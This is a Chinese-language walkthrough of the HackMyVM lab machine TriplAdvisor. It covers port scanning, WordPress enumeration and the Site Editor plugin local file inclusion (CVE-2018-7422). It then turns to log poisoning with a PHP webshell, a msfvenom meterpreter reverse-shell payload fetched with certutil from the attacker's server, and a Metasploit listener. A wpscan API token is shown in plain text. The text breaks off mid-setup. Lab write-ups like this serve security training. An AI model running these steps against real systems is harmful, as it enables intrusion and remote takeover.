---
title: HMV-TriplAdvisor
description: 'Hope you enjoy it.'
pubDate: 2026-01-28
image: /machine/TriplAdvisor.png
categories:
  - Documentation
tags:
  - Hackmyvm
  - Windows Machine
---

![](/image/hmvmachines/TriplAdvisor-1.png)

# 信息收集
## IP定位
```plain
┌──(web)─(root㉿kali)-[/home/kali]
└─# ifconfig

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.0.108  netmask 255.255.255.0  broadcast 192.168.0.255
        inet6 fe80::cb0c:b9b1:dfd6:d4a5  prefixlen 64  scopeid 0x20<link>
        ether 00:0c:29:3d:0e:65  txqueuelen 1000  (Ethernet)
        RX packets 196  bytes 20063 (19.5 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 535  bytes 33812 (33.0 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

```plain
┌──(web)─(root㉿kali)-[/home/kali]
└─# arp-scan -l | grep 08:00:27

WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
192.168.0.102   08:00:27:70:a3:d3       (Unknown)
```

## rustscan扫描
```plain
┌──(web)─(root㉿kali)-[/home/kali]
└─# rustscan -a 192.168.0.102 --ulimit 5000 -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
I scanned ports so fast, even my computer was surprised.

[~] The config file is expected to be at "/root/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 192.168.0.102:445
Open 192.168.0.102:5985
Open 192.168.0.102:8080
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -A" on ip 192.168.0.102
Depending on the complexity of the script, results may take some time to appear.

Completed ARP Ping Scan at 23:18, 0.05s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 23:18
Completed Parallel DNS resolution of 1 host. at 23:18, 0.04s elapsed
DNS resolution of 1 IPs took 0.04s. Mode: Async [#: 3, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 23:18
Scanning 192.168.0.102 [3 ports]
Discovered open port 5985/tcp on 192.168.0.102
Discovered open port 8080/tcp on 192.168.0.102
Discovered open port 445/tcp on 192.168.0.102

PORT     STATE SERVICE       REASON          VERSION
445/tcp  open  microsoft-ds? syn-ack ttl 128
5985/tcp open  http          syn-ack ttl 128 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8080/tcp open  http          syn-ack ttl 128 Apache httpd
|_http-open-proxy: Proxy might be redirecting requests
|_http-favicon: Unknown favicon MD5: 3BD2EC61324AD4D27CB7B0F484CD4289
|_http-title: Did not follow redirect to http://tripladvisor:8080/wordpress/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache
MAC Address: 08:00:27:70:A3:D3 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: specialized|phone
Running: Microsoft Windows 7|Phone
OS CPE: cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows
OS details: Microsoft Windows Embedded Standard 7, Microsoft Windows Phone 7.5 or 8.0
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=1/26%OT=445%CT=%CU=%PV=Y%DS=1%DC=D%G=N%M=080027%TM=
OS:69783CF3%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10C%TI=I%II=I%SS=S%T
OS:S=7)OPS(O1=M5B4NW8ST11%O2=M5B4NW8ST11%O3=M5B4NW8NNT11%O4=M5B4NW8ST11%O5=
OS:M5B4NW8ST11%O6=M5B4ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2
OS:000)ECN(R=Y%DF=Y%TG=80%W=2000%O=M5B4NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%TG=80%S=O
OS:%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)U1(R=N)IE(R=Y%DFI=N%TG=80%CD=Z)

Uptime guess: 0.005 days (since Mon Jan 26 23:12:46 2026)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 23183/tcp): CLEAN (Timeout)
|   Check 2 (port 2137/tcp): CLEAN (Timeout)
|   Check 3 (port 12633/udp): CLEAN (Timeout)
|   Check 4 (port 42984/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2026-01-27T20:19:22
|_  start_date: 2026-01-27T20:13:04
|_clock-skew: 15h59m57s
```

#### 开放端口总览
| 端口 | 服务 | 关键信息 | 价值 |
| --- | --- | --- | --- |
| **445** | SMB | SMBv2，**签名开启但非强制** | ⭐⭐⭐⭐ |
| **5985** | WinRM | Microsoft HTTPAPI/2.0 | ⭐⭐⭐ |
| **8080** | HTTP | Apache → WordPress 重定向 | ⭐⭐⭐⭐⭐ |


##### 445 / SMB（重点之一）
###### 你现在知道的
```plain
SMB2
Message signing enabled but not required
```

👉 **这是好消息**  
意思是：

+ 可以尝试 **NTLM relay**
+ 可以尝试 **匿名枚举**
+ 不是“铁板 SMB”

###### 下一步必做
```plain
enum4linux -a 192.168.0.102
```

或更直接：

```plain
nmap -p445 --script smb-enum-shares,smb-enum-users,smb-os-discovery 192.168.0.102
```

目标是拿到：

+ 用户名
+ 共享
+ 域 / 主机名

---

##### 🧠 5985 / WinRM（潜在直接拿 Shell）
```plain
5985/tcp open  http  Microsoft HTTPAPI httpd 2.0
```

WinRM 的规则很简单：

**有凭据 = 直接管理员 Shell**

你现在缺的不是漏洞，是：

+ 用户名
+ 密码 / hash

一旦从 **WordPress / SMB** 拿到凭据，直接：

```plain
evil-winrm -i 192.168.0.102 -u USER -p PASS
```

或 hash：

```plain
evil-winrm -i 192.168.0.102 -u USER -H NTLM_HASH
```

---

##### 🔥 8080 / Web（当前最优先）
###### 核心信息
```plain
Apache httpd
Redirect → http://tripladvisor:8080/wordpress/
```

这句话 **非常关键**：

👉 这是一个 **WordPress 站点**  
👉 还泄露了 **主机名：tripladvisor**

---

##### 8080 端口的标准攻击流程（照着打）
###### 1️⃣ 先修 hosts（否则 WP 扫描会坑你）
```plain
echo "192.168.0.102 tripladvisor" >> /etc/hosts
```

然后访问：

```plain
http://tripladvisor:8080/wordpress/
```

---

###### 2️⃣ WordPress 指纹 + 用户枚举
```plain
wpscan --url http://tripladvisor:8080/wordpress/ --enumerate u,p,t
```

重点看：

+ 👤 用户名
+ 🔌 插件（是否有已知 CVE）

## enum4linux
```plain
┌──(web)─(root㉿kali)-[/home/kali]
└─# enum4linux -a 192.168.0.102
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Jan 27 03:07:46 2026

 =========================================( Target Information )=========================================

Target ........... 192.168.0.102
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===========================( Enumerating Workgroup/Domain on 192.168.0.102 )===========================


[E] Can't find workgroup/domain



 ===============================( Nbtstat Information for 192.168.0.102 )===============================        
                                                        
Looking up status of 192.168.0.102                      
No reply from 192.168.0.102

 ===================================( Session Check on 192.168.0.102 )===================================       
                                                        
                                                        
[+] Server 192.168.0.102 allows sessions using username '', password ''                                         
                                                        
                                                        
 ================================( Getting domain SID for 192.168.0.102 )================================       
                                                        
do_cmd: Could not initialise lsarpc. Error was NT_STATUS_ACCESS_DENIED

[+] Can't determine if host is part of domain or part of a workgroup                                            
                                                        
                                                        
 ==================================( OS information on 192.168.0.102 )==================================        
                                                        
                                                        
[E] Can't get OS info with smbclient                    
                                                        
                                                        
[+] Got OS info for 192.168.0.102 from srvinfo:         
do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED


 =======================================( Users on 192.168.0.102 )=======================================       
                                                        
                                                        
[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED                                            
                                                        
                                                        

[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED                                             
                                                        
                                                        
 =================================( Share Enumeration on 192.168.0.102 )=================================       
                                                        
do_connect: Connection to 192.168.0.102 failed (Error NT_STATUS_IO_TIMEOUT)

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 192.168.0.102           
                                                        
                                                        
 ===========================( Password Policy Information for 192.168.0.102 )===========================        
                                                        
ldapsea                                                 
[E] Unexpected error from polenum:                      
                                                        
                                                        

[+] Attaching to 192.168.0.102 using a NULL share

[+] Trying protocol 139/SMB...

        [!] Protocol failed: [Errno Connection error (192.168.0.102:139)] timed out

[+] Trying protocol 445/SMB...

        [!] Protocol failed: SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.



[E] Failed to get password policy with rpcclient        
                                                        
                                                        

 ======================================( Groups on 192.168.0.102 )======================================        
                                                        
                                                        
[+] Getting builtin groups:                             
                                                        
                                                        
[+]  Getting builtin group memberships:                 
                                                        
                                                        
[+]  Getting local groups:                              
                                                        
                                                        
[+]  Getting local group memberships:                   
                                                        
                                                        
[+]  Getting domain groups:                             
                                                        
                                                        
[+]  Getting domain group memberships:                  
                                                        
                                                        
 ==================( Users on 192.168.0.102 via RID cycling (RIDS: 500-550,1000-1050) )==================       
                                                        
                                                        
[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.                                       
                                                        
                                                        
 ===============================( Getting printer info for 192.168.0.102 )===============================       
                                                        
do_cmd: Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED


enum4linux complete on Tue Jan 27 03:08:42 2026
```

## Wpscan
```plain
┌──(web)─(root㉿kali)-[/home/kali]
└─# echo "192.168.0.102 tripladvisor" >> /etc/hosts
```

扫描分俩段式

###  第一段：快，找入口  
```plain
wpscan --url http://tripladvisor:8080/wordpress/ \
  -e u,vp \
  --plugins-detection mixed \
  --api-token "NEzNxgvCrcyIZN1aYoHxHyUda29vcAIcsbaCrFngLA0"
```

目的：

+ 找 **能打的插件**
+ 找 **用户**
+ 用时：几分钟

###  第二段：只对“命中插件”开 aggressive  
```plain
wpscan --url http://tripladvisor:8080/wordpress/ \
  --plugins-detection aggressive \
  --plugins-list plugin1,plugin2,plugin3 \
  --api-token YOUR_TOKEN
```

| 参数 | 作用 |
| --- | --- |
| `ep` | 仅已知有漏洞的插件   |
| `ap` | 所有插件 |
| `at` | 所有主题 |
| `tt` | 时间线用户枚举 |
| `cb` | 配置备份文件 |
| `dbe` | 数据库导出 |
| `--themes-detection aggressive` | 主题也暴力 |
| `--max-threads 5` | **降速防封** |


### 扫描详情
太卡了太卡了太卡了太卡了！！！！！！

扫不了一点

```plain
wpscan --url http://tripladvisor:8080/wordpress/ \
  -e u,ap,at,tt,cb,dbe \
  --plugins-detection aggressive \
  --themes-detection aggressive \
  --api-token YOUR_TOKEN \
```

这条指令要扫三天

```plain
wpscan --url http://tripladvisor:8080/wordpress/ \
  -e u,vp \
  --plugins-detection mixed \
  --api-token "NEzNxgvCrcyIZN1aYoHxHyUda29vcAIcsbaCrFngLA0"
```

```plain
┌──(web)─(root㉿kali)-[/home/kali]
└─# wpscan --url http://tripladvisor:8080/wordpress/  --api-token "NEzNxgvCrcyIZN1aYoHxHyUda29vcAIcsbaCrFngLA0"
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://tripladvisor:8080/wordpress/ [192.168.0.102]
[+] Started: Tue Jan 27 03:53:05 2026

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://tripladvisor:8080/wordpress/xmlrpc.php
 | Found By: Headers (Passive Detection)
 | Confidence: 100%
 | Confirmed By:
 |  - Link Tag (Passive Detection), 30% confidence
 |  - Direct Access (Aggressive Detection), 100% confidence
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://tripladvisor:8080/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://tripladvisor:8080/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://tripladvisor:8080/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.1.19 identified (Insecure, released on 2024-06-24).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://tripladvisor:8080/wordpress/, Match: '-release.min.js?ver=5.1.19'
 | Confirmed By: Most Common Wp Includes Query Parameter In Homepage (Passive Detection)
 |  - http://tripladvisor:8080/wordpress/wp-includes/css/dist/block-library/style.min.css?ver=5.1.19
 |  - http://tripladvisor:8080/wordpress/wp-includes/js/wp-embed.min.js?ver=5.1.19
 |
 | [!] 2 vulnerabilities identified:
 |
 | [!] Title: WP < 6.8.3 - Author+ DOM Stored XSS
 |     Fixed in: 5.1.21
 |     References:
 |      - https://wpscan.com/vulnerability/c4616b57-770f-4c40-93f8-29571c80330a
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-58674
 |      - https://patchstack.com/database/wordpress/wordpress/wordpress/vulnerability/wordpress-wordpress-wordpress-6-8-2-cross-site-scripting-xss-vulnerability
 |      -  https://wordpress.org/news/2025/09/wordpress-6-8-3-release/
 |
 | [!] Title: WP < 6.8.3 - Contributor+ Sensitive Data Disclosure
 |     Fixed in: 5.1.21
 |     References:
 |      - https://wpscan.com/vulnerability/1e2dad30-dd95-4142-903b-4d5c580eaad2
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-58246
 |      - https://patchstack.com/database/wordpress/wordpress/wordpress/vulnerability/wordpress-wordpress-wordpress-6-8-2-sensitive-data-exposure-vulnerability
 |      - https://wordpress.org/news/2025/09/wordpress-6-8-3-release/

[+] WordPress theme in use: expert-adventure-guide
 | Location: http://tripladvisor:8080/wordpress/wp-content/themes/expert-adventure-guide/
 | Last Updated: 2026-01-13T00:00:00.000Z
 | Readme: http://tripladvisor:8080/wordpress/wp-content/themes/expert-adventure-guide/readme.txt
 | [!] The version is out of date, the latest version is 11.4
 | Style URL: http://tripladvisor:8080/wordpress/wp-content/themes/expert-adventure-guide/style.css?ver=5.1.19
 | Style Name: Expert Adventure Guide
 | Style URI: https://www.seothemesexpert.com/wordpress/free-adventure-wordpress-theme/
 | Description: Expert Adventure Guide is a specialized and user-friendly design crafted for professional adventure ...
 | Author: drakearthur
 | Author URI: https://www.seothemesexpert.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://tripladvisor:8080/wordpress/wp-content/themes/expert-adventure-guide/style.css?ver=5.1.19, Match: 'Version: 1.0'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] editor
 | Location: http://tripladvisor:8080/wordpress/wp-content/plugins/editor/
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 1.1 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://tripladvisor:8080/wordpress/wp-content/plugins/editor/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://tripladvisor:8080/wordpress/wp-content/plugins/editor/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
[i] No Config Backups Found.

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 3
 | Requests Remaining: 18


```

想尝试枚举的但是太慢了换个思路

根据扫描我们发现了存在editor的插件且给出了readme.txt

访问[http://tripladvisor:8080/wordpress/wp-content/plugins/editor/readme.txt](http://tripladvisor:8080/wordpress/wp-content/plugins/editor/readme.txt)

可以得知全称为Site Editor

```plain
┌──(web)─(root㉿kali)-[/home/kali]
└─# searchsploit -s Site Editor 
------------------------ ---------------------------------
 Exploit Title          |  Path
------------------------ ---------------------------------
Apple WebKit / Safari 1 | multiple/webapps/42064.html
CityPost PHP Image Edit | php/webapps/25459.txt
CKEditor - 'posteddata. | php/webapps/38322.txt
CKEditor 5 35.4.0 - Cro | php/webapps/51260.txt
Django CMS 3.3.0 - Edit | python/webapps/40129.txt
Dreambox Plugin Bouquet | hardware/webapps/42986.txt
Drupal Module CKEditor  | php/webapps/18389.txt
Drupal Module CKEditor  | php/webapps/25493.txt
EasySite 2.0 - 'image_e | php/webapps/31588.txt
FCKEditor Core - 'Edito | php/webapps/37457.html
FlexCMS 2.5 - 'inc-core | php/webapps/32254.txt
Jax PHP Scripts 1.0/1.3 | php/webapps/26081.txt
Kim Websites 1.0 - 'FCK | php/webapps/6410.txt
KindEditor - 'name' Cro | php/webapps/37652.txt
Mambo Open Source 4.6.2 | php/webapps/32253.txt
Moeditor 0.2.0 - Persis | multiple/webapps/49830.js
MoinMoin 1.x - 'PageEdi | cgi/webapps/34080.txt
MyBB Visual Editor 1.8. | php/webapps/45449.txt
Nakid CMS 1.0.2 - 'CKEd | php/webapps/35829.txt
Network Weathermap 0.97 | php/webapps/24913.txt
ocPortal 7.1.5 - 'code_ | php/webapps/37022.txt
Orbis CMS 1.0.2 - 'edit | php/webapps/34253.txt
Plesk Small Business Ma | php/webapps/15313.txt
pragmaMx 1.12.1 - '/inc | php/webapps/37313.txt
Site@School 2.4.10 - 'F | php/webapps/6005.php
SiteWare 2.5/3.0/3.1 Ed | java/webapps/20925.txt
SnippetMaster Webpage E | php/webapps/8017.txt
WordPress Plugin Site E | php/webapps/44340.txt
WordPress Plugin User R | php/webapps/25721.txt
------------------------ ---------------------------------
Shellcodes: No Results
```

可以看见WordPress Plugin Site E | php/webapps/44340.txt

这个可能会是

```plain
┌──(web)─(root㉿kali)-[/home/kali]
└─# searchsploit -p 44340                 
  Exploit: WordPress Plugin Site Editor 1.1.1 - Local File Inclusion
      URL: https://www.exploit-db.com/exploits/44340
     Path: /usr/share/exploitdb/exploits/php/webapps/44340.txt
    Codes: CVE-2018-7422
 Verified: True
File Type: Unicode text, UTF-8 text

┌──(web)─(root㉿kali)-[/home/kali]
└─# cat /usr/share/exploitdb/exploits/php/webapps/44340.txt
Product: Site Editor Wordpress Plugin - https://wordpress.org/plugins/site-editor/
Vendor: Site Editor
Tested version: 1.1.1
CVE ID: CVE-2018-7422

** CVE description **
A Local File Inclusion vulnerability in the Site Editor plugin through 1.1.1 for WordPress allows remote attackers to retrieve arbitrary files via the ajax_path parameter to editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php.

** Technical details **
In site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php:5, the value of the ajax_path parameter is used for including a file with PHP’s require_once(). This parameter can be controlled by an attacker and is not properly sanitized.

Vulnerable code:
if( isset( $_REQUEST['ajax_path'] ) && is_file( $_REQUEST['ajax_path'] ) && file_exists( $_REQUEST['ajax_path'] ) ){
    require_once $_REQUEST['ajax_path'];
}

https://plugins.trac.wordpress.org/browser/site-editor/trunk/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?rev=1640500#L5

By providing a specially crafted path to the vulnerable parameter, a remote attacker can retrieve the contents of sensitive files on the local system.

** Proof of Concept **
http://<host>/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd

** Solution **
No fix available yet.

** Timeline **
03/01/2018: author contacted through siteeditor.org's contact form; no reply
16/01/2018: issue report filled on the public GitHub page with no technical details
18/01/2018: author replies and said he replied to our e-mail 8 days ago (could not find the aforementioned e-mail at all); author sends us "another" e-mail
19/01/2018: report sent; author says he will fix this issue "very soon"
31/01/2018: vendor contacted to ask about an approximate release date and if he needs us to postpone the disclosure; no reply
14/02/2018: WP Plugins team contacted; no reply
06/03/2018: vendor contacted; no reply
07/03/2018: vendor contacted; no reply
15/03/2018: public disclosure

** Credits **
Vulnerability discovered by Nicolas Buzy-Debat working at Orange Cyberdefense Singapore (CERT-LEXSI).

--
Best Regards,

Nicolas Buzy-Debat
Orange Cyberdefense Singapore (CERT-LEXSI)  
```

```plain
# 使用Metasploit模块
msfconsole
search site_editor
use exploit/unix/webapp/wp_site_editor_lfi
set RHOSTS mamushka.hmv
set TARGETURI /
run
```

由于msf没有

 因为知道这个是 windows 机子，所以可以尝试一下相关目录，比如：  

```plain
/boot.ini
/autoexec.bat
/windows/system32/drivers/etc/hosts
/windows/repair/SAM
/windows/panther/unattended.xml
/windows/panther/unattend/unattended.xml
/windows/system32/license.rtf
/windows/system32/eula.txt
```

```plain
** Proof of Concept **
http://<host>/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
```

这里路径要改一下http://<host>/wp-content/ 改为http://<host>/wordpress/wp-content/

/site-editor要改为/editor

```plain
┌──(web)─(root㉿kali)-[/home/kali]
└─# curl "http://tripladvisor:8080/wordpress/wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/windows/system32/drivers/etc/hosts"     
# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to host names. Each
# entry should be kept on an individual line. The IP address should
# be placed in the first column followed by the corresponding host name.
# The IP address and the host name should be separated by at least one
# space.
#
# Additionally, comments (such as these) may be inserted on individual
# lines or following the machine name denoted by a '#' symbol.
#
# For example:
#
#      102.54.94.97     rhino.acme.com          # source server
#       38.25.63.10     x.acme.com              # x client host

# localhost name resolution is handled within DNS itself.
#       127.0.0.1       localhost
#       ::1             localhost
{"success":true,"data":{"output":[]}}  
```

# RCE
我们可以成功读取到文件，想要rce的话那就是需要读取日志中的文件然后getshell

先fuzz下可以读取哪些windows目录文件

```plain
┌──(kali💀kali)-[~/temp/TriplAdvisor]
└─$ ll /usr/share/seclists/Fuzzing/LFI
total 872
-rw-r--r-- 1 root root 254354 Feb 16  2024 LFI-etc-files-of-all-linux-packages.txt
-rw-r--r-- 1 root root  22883 Feb 16  2024 LFI-gracefulsecurity-linux.txt
-rw-r--r-- 1 root root   9416 Feb 16  2024 LFI-gracefulsecurity-windows.txt
-rw-r--r-- 1 root root  32507 Feb 16  2024 LFI-Jhaddix.txt
-rw-r--r-- 1 root root 501947 Feb 16  2024 LFI-LFISuite-pathtotest-huge.txt
-rw-r--r-- 1 root root  22215 Feb 16  2024 LFI-LFISuite-pathtotest.txt
-rw-r--r-- 1 root root  31898 Feb 16  2024 LFI-linux-and-windows_by-1N3@CrowdShield.txt
-rw-r--r-- 1 root root   2165 Feb 16  2024 OMI-Agent-Linux.txt

┌──(kali💀kali)-[~/temp/TriplAdvisor]
└─$ wfuzz -c -w //usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt -u "http://tripladvisor:8080/wordpress/wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=FUZZ" --hh 72 2>/dev/null
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://tripladvisor:8080/wordpress/wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=FUZZ
Total requests: 235

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                     
=====================================================================

000000044:   200        7 L      13 W       129 Ch      "C:/Windows/win.ini"                                                                                                        
000000043:   200        21 L     135 W      861 Ch      "C:/WINDOWS/System32/drivers/etc/hosts"                                                                                     
000000048:   200        939 L    15552 W    206724 Ch   "C:/xampp/apache/logs/access.log"                                                                                           
000000049:   200        33746    712193 W   5744606 C   "C:/xampp/apache/logs/error.log"                                                                                            
                        L                   h                                                                                                                                       
000000164:   200        0 L      1 W        37 Ch       "c:/xampp/phpMyAdmin/config.inc.php"                                                                                        
000000163:   500        0 L      0 W        0 Ch        "c:/xampp/php/php.ini"                                                                                                      
000000165:   200        72 L     319 W      2133 Ch     "c:/xampp/sendmail/sendmail.ini"                                                                                            
000000160:   200        564 L    2563 W     21507 Ch    "c:/xampp/apache/conf/httpd.conf"                                                                                           
000000154:   200        1092 L   17388 W    243793 Ch   "c:/xampp/apache/logs/access.log"                                                                                           
000000155:   200        33746    712193 W   5744606 C   "c:/xampp/apache/logs/error.log"                                                                                            
                        L                   h                                                                                                                                       
000000229:   200        0 L      1 W        37 Ch       "c:/WINDOWS/setuperr.log"                                                                                                   
000000227:   200        176 L    1036 W     14543 Ch    "c:/WINDOWS/setupact.log"                                                                                                   
000000219:   200        79 L     585 W      3720 Ch     "c:/WINDOWS/system32/drivers/etc/lmhosts.sam"                                                                               
000000220:   200        16 L     55 W       444 Ch      "c:/WINDOWS/system32/drivers/etc/networks"                                                                                  
000000218:   200        21 L     135 W      861 Ch      "c:/WINDOWS/system32/drivers/etc/hosts"                                                                                     
000000221:   200        27 L     171 W      1395 Ch     "c:/WINDOWS/system32/drivers/etc/protocol"                                                                                  
000000222:   200        285 L    1238 W     17500 Ch    "c:/WINDOWS/system32/drivers/etc/services"                                                                                  
000000232:   200        2806 L   28871 W    227306 Ch   "c:/WINDOWS/WindowsUpdate.log"                                                                                              

Total time: 0
Processed Requests: 235
Filtered Requests: 217
Requests/sec.: 0

```

**LFI（Local File Inclusion，本地文件包含）**  
👉 程序把**用户可控的参数**当成“文件路径”去 `include / require / read`，  
👉 导致**服务器本地文件被读取或执行**。  

"c:/xampp/apache/logs/access.log"   扫描出站点日志可读

```plain
curl -A "<?php system(\$_GET['cmd']);?>"  http://tripladvisor:8080/wordpress/ 
curl "http://tripladvisor:8080/wordpress/wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=C:\xampp\apache\logs\access.log&cmd=dir"
```

先生成一个反弹shell脚本：

```plain
┌──(web)─(root㉿kali)-[/home/kali]
└─# msfvenom -p windows/meterpreter/reverse_tcp \
> LHOST=192.168.0.108 LPORT=6666 \
> -f exe -o shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
Saved as: shell.exe
```

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/hmv]
└─# updog -p 8000
[+] Serving /home/kali/Desktop/hmv on 0.0.0.0:8000...
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://192.168.0.108:8000
Press CTRL+C to quit

```

命令执行不了了，日志写满了要重置下环境

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/hmv]
└─# arp-scan -l | grep 08:00:27

192.168.0.110   08:00:27:c0:88:40       PCS Systemtechnik GmbH
```

```plain
http://tripladvisor:8080/wordpress/wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=C:\xampp\apache\logs\access.log&cmd=certutil.exe%20-urlcache%20-split%20-f%20http://192.168.0.108:8000/shell.exe
http://tripladvisor:8080/wordpress/wp-content/plugins/editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=C:\xampp\apache\logs\access.log&cmd=shell.exe
```

由于环境不能使用pwncat所有使用rlwrap nc 

好吧也没成功

```plain
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.0.108
set LPORT 6666
run
```

```plain
sf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > 
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
